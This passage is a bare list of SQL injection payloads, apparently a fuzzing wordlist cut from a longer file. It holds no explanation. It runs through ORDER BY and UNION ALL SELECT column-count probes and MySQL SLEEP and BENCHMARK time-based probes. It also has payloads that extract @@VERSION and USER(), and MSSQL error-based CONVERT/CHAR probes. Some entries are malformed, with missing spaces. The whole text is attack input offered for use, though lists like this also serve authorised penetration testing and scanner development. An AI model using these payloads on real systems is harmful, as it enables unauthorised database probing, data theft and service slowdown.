1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30# ORDER BY SLEEP(5)-- ORDER BY 1,SLEEP(5)-- ORDER BY 1,SLEEP(5),3-- ORDER BY 1,SLEEP(5),3,4-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION ALL SELECT 1 UNION ALL SELECT 1,2 UNION ALL SELECT 1,2,3 UNION ALL SELECT 1,2,3,4 UNION ALL SELECT 1,2,3,4,5 UNION ALL SELECT 1,2,3,4,5,6 UNION ALL SELECT 1,2,3,4,5,6,7 UNION ALL SELECT 1,2,3,4,5,6,7,8 UNION ALL SELECT 1,2,3,4,5,6,7,8,9 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 UNION ALL SELECT 1# UNION ALL SELECT 1,2# UNION ALL SELECT 1,2,3# UNION ALL SELECT 1,2,3,4# UNION ALL SELECT 1,2,3,4,5# UNION ALL SELECT 1,2,3,4,5,6# UNION ALL SELECT 1,2,3,4,5,6,7# UNION ALL SELECT 1,2,3,4,5,6,7,8# UNION ALL SELECT 1,2,3,4,5,6,7,8,9# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30# UNION ALL SELECT 1-- UNION ALL SELECT 1,2-- UNION ALL SELECT 1,2,3-- UNION ALL SELECT 1,2,3,4-- UNION ALL SELECT 1,2,3,4,5-- UNION ALL SELECT 1,2,3,4,5,6-- UNION ALL SELECT 1,2,3,4,5,6,7-- UNION ALL SELECT 1,2,3,4,5,6,7,8-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION SELECT @@VERSION,SLEEP(5),3 UNION SELECT @@VERSION,SLEEP(5),USER(),4 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 UNION SELECT @@VERSION,SLEEP(5),\"'3 UNION SELECT @@VERSION,SLEEP(5),\"'3'\"# UNION SELECT @@VERSION,SLEEP(5),USER(),4# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30# UNION ALL SELECT USER()-- UNION ALL SELECT SLEEP(5)-- UNION ALL SELECT USER(),SLEEP(5)-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT NULL-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- UNION ALL SELECT NULL# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL 